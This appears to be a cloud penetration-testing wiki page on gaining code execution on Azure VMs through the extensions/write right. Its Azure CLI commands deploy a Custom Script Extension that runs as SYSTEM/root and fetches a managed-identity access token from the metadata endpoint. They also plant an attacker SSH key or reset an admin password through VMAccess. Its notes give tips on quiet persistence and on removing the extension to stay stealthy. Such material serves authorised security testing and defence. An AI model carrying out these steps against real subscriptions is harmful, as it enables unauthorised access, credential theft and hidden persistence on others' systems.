---
title: "Custom Script Extension: code execution through extensions/write"
order: 2
description: "Executing code on an Azure VM by writing a Custom Script Extension or VMAccess extension through extensions/write."
keywords:
  - custom script extension
  - VMAccess
  - extensions write
  - VM
  - code execution
---

# Custom Script Extension

`Microsoft.Compute/virtualMachines/extensions/write` installs an extension that the guest agent runs as SYSTEM or root. The **Custom Script Extension** downloads and runs an arbitrary script; the **VMAccess** extension resets the local administrator password or SSH key, giving interactive access. This is a distinct right from run command, so a principal denied one often still holds the other.

## Custom Script Extension

```bash
az vm extension set -g <rg> --vm-name <vm> \
  --name CustomScript --publisher Microsoft.Azure.Extensions \
  --settings '{"commandToExecute":"id && curl -s -H Metadata:true http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"}'
```

## VMAccess: reset access

```bash
# Linux: set a new user/key
az vm extension set -g <rg> --vm-name <vm> \
  --name VMAccessForLinux --publisher Microsoft.OSTCExtensions \
  --protected-settings '{"username":"att","ssh_key":"ssh-ed25519 AAAA..."}'
# Windows equivalent: az vm user update -g <rg> -n <vm> -u admin -p 'Newpass123!'
```

## Exploitation notes

- Same end state as [run command](run-command.md); choose whichever action your role allows.
- VMAccess is the quieter route to a durable interactive logon when you want a session rather than one-shot execution.
- An extension is a visible resource on the VM; remove it after use if stealth matters.

## Tools

- **Azure CLI** (`az vm extension set`).
- **MicroBurst**: VM command execution and extension helpers.

## References

- [Microsoft: Custom Script Extension for Linux](https://learn.microsoft.com/azure/virtual-machines/extensions/custom-script-linux)
- [NetSPI: MicroBurst](https://github.com/NetSPI/MicroBurst)
- [HackTricks Cloud: Azure](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
